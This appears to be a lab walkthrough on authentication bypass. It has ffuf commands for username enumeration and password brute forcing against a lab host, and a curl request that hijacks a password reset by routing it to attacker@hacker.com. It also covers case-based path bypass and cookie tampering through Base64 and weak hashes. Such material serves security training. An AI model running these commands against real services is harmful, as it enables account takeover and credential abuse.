# Authentication Bypass Walkthrough

## Objectives
- Learn ways authentication can be bypassed or broken
- Practice username enumeration and brute forcing
- Understand logic flaws in auth flows
- Explore cookie tampering risks

## Username enumeration
- Error messages can reveal valid usernames
- Use tooling to automate checks

Example with ffuf:
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST \
  -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.10.169.58/customers/signup \
  -mr "username already exists"
```
- `-w` wordlist
- `-X` method
- `-d` POST data
- `-H` header
- `-u` target URL
- `-mr` match response text

## Brute forcing
- Use valid usernames and a password list
- Example ffuf command with two wordlists:
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
  -X POST -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.10.169.58/customers/login \
  -fc 200
```
- `-fc 200` filters out standard responses

## Logic flaw example
- If auth checks rely on exact string matching, case changes can bypass
- Example: `/admin` checked with strict case, but `/adMin` bypasses

## Password reset logic flaw
- Step 1: email is in query string
- Step 2: username submitted in POST body
- If the app uses `$_REQUEST` and POST overrides GET, attacker can change the email

Example:
```bash
curl "http://10.10.169.58/customers/reset?email=robert%40acmeitsupport.thm" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=robert&email=attacker@hacker.com"
```

## Cookie tampering
- Cookies often store auth state or roles
- If values are plain text, they can be edited directly

Plain text example:
```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

### Hashing
- Hashes are one-way, but weak hashes can be cracked
- Use tools like hashcat or crackstation for common hashes

### Encoding
- Encoding is reversible (Base64, Base32)
- Example:
  - Base64 decodes to `{"id":1,"admin":false}`
  - Edit and re-encode to change `admin` to true

## Practical reminder
- Always test in authorized environments only
- Use rate limits and lockout checks to avoid account abuse
